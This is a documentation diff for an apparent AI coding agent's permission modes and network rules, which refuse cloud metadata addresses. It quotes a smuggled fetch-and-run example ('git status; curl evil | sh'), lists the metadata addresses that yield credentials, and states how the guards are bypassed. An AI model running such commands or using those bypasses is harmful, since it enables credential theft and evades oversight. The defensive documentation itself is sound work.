@@ -19,7 +19,7 @@ permission gate (`/mode`).
 |---|---|
 | `default` | asks before every edit and every command that is not clearly read-only |
 | `accept-edits` | edits project files freely, still asks before commands |
-| `plan` | read-only: nothing is changed, whatever an `allow` rule says |
+| `plan` | read-only: nothing is changed, whatever an `allow` rule says. The model is told it is in plan mode and may ask you clarifying questions (`ask_user`) before it plans |
 | `yolo` | asks for nothing. Only deny rules in `permissions.json` still hold |
 
 Switch with `shift+tab`, `/mode`, `/accept-edits` or `/yolo` (each toggles), or start
@@ -55,6 +55,20 @@ in a place you can afford to lose: a container, a throwaway checkout.
   rules apply. A guarded action from a thread the cell left running after it finished
   is refused. This uses Python's audit hooks, so code written to get around it
   (`ctypes`, a native extension) can.
+- **Network: `net` rules, and no cloud metadata by default.** A command's hosts (URLs,
+  `user@host:` remotes, the operands of `curl`, `wget`, `ssh`, `nc` and the like, and
+  any address literal) are tested against rules for the tool `net`, in every mode:
+  `{"tool": "net", "pattern": "*.example.com", "action": "deny"}` refuses, and an `ask`
+  rule asks even in `yolo` and over an `allow` for the command, so
+  `[{"tool": "net", "pattern": "api.github.com", "action": "allow"}, {"tool": "net", "action": "ask"}]`
+  asks about every other host. A cloud metadata address (`169.254.169.254` in any
+  spelling, the rest of `169.254.0.0/16`, `fe80::/10`, `fd00:ec2::254`, `100.100.100.200`,
+  `metadata.google.internal`), which hands out a cloud machine's credentials, is refused
+  unless a `net` `allow` rule names it; local and private addresses are not blocked,
+  since development servers live there. A Python cell's connections and name lookups are
+  checked by the address it really uses, and an MCP server at a refused address is not
+  connected. In a shell command this is a filter: a host that a script builds, or a name
+  that resolves to a metadata address, gets past it.
 - **`allow` rules and "always" grants end on a word and never cover a compound
   command.** `git status*` does not cover `git statusx` or `git status; curl evil | sh`,
   and an approval of `rm -rf dist` covers exactly that command. A path `allow` is
